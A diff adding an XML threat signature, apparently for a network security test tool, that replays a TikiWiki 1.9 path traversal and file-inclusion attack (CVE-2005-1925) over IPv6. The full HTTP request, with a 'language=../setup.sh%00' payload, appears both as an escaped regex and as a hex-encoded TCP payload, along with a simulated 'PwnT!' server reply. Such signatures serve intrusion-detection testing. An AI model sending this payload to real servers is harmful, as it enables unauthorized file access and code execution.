@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="TikiWiki tiki-user_preferences.php Command Injection (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a crafted HTTP Request with with a modified URL string containing an invalid language name, this name is used directly to access the language include file which is unchecked and can be used to access arbitrary files, if that file contains PHP it will be also be executed. TikiWiki is a web application that typically listens on port 80. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Unauthorized_Use"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="TikiWiki"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="TikiWiki_TikiWiki"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="TikiWiki_TikiWiki_1.9"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/application/poi/display?id=335&amp;type=vulnerabilities"/>
+    <CVEID display="true" value="CVE-2005-1925"/>
+    <bugtraqID display="true" value="15392"/>
+    <OSVDB display="true" value="20923"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="21127546a98b22a75aa0a70ba98c879a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236797533"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X50\X4F\X53\X54\X20\X2F\X73\X63\X72\X69\X70\X74\X73\X2F\X74\X69\X6B\X69\X77\X69\X6B\X69\X2F\X74\X69\X6B\X69\X2D\X75\X73\X65\X72\X5F\X70\X72\X65\X66\X65\X72\X65\X6E\X63\X65\X73\X2E\X70\X68\X70\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0D\X0A\X55\X73\X65\X72\X2D\X41\X67\X65\X6E\X74\X3A\X20\X57\X67\X65\X74\X2F\X31\X2E\X39\X0D\X0A\X48\X6F\X73\X74\X3A\X20\X77\X77\X77\X2E\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X61\X70\X70\X6C\X69\X63\X61\X74\X69\X6F\X6E\X2F\X78\X2D\X77\X77\X77\X2D\X66\X6F\X72\X6D\X2D\X75\X72\X6C\X65\X6E\X63\X6F\X64\X65\X64\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X4C\X65\X6E\X67\X74\X68\X3A\X20\X36\X30\X0D\X0A\X43\X6F\X6F\X6B\X69\X65\X3A\X20\X50\X48\X50\X53\X45\X53\X53\X49\X44\X3D\X35\X37\X64\X30\X61\X30\X65\X39\X65\X33\X38\X32\X38\X37\X34\X61\X34\X62\X31\X34\X32\X62\X64\X61\X36\X61\X38\X61\X66\X62\X65\X34\X0D\X0A\X0D\X0A\X26\X6C\X61\X6E\X67\X75\X61\X67\X65\X3D\X2E\X2E\X2F\X73\X65\X74\X75\X70\X2E\X73\X68\X25\X30\X30\X26\X75\X73\X65\X72\X5F\X64\X62\X6C\X3D\X6F\X6E\X26\X70\X72\X65\X66\X73\X3D\X43\X68\X61\X6E\X67\X65\X2B\X70\X72\X65\X66\X65\X72\X65\X6E\X63\X65"/>
+    <Created value="1139462512" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504F5354202F736372697074732F74696B6977696B692F74696B692D757365725F707265666572656E6365732E70687020485454502F312E300D0A557365722D4167656E743A20576765742F312E390D0A486F73743A207777772E6578616D706C652E636F6D0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A436F6E74656E742D4C656E6774683A2036300D0A436F6F6B69653A205048505345535349443D35376430613065396533383238373461346231343262646136613861666265340D0A0D0A266C616E67756167653D2E2E2F73657475702E736825303026757365725F64626C3D6F6E2670726566733D4368616E67652B707265666572656E6365" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
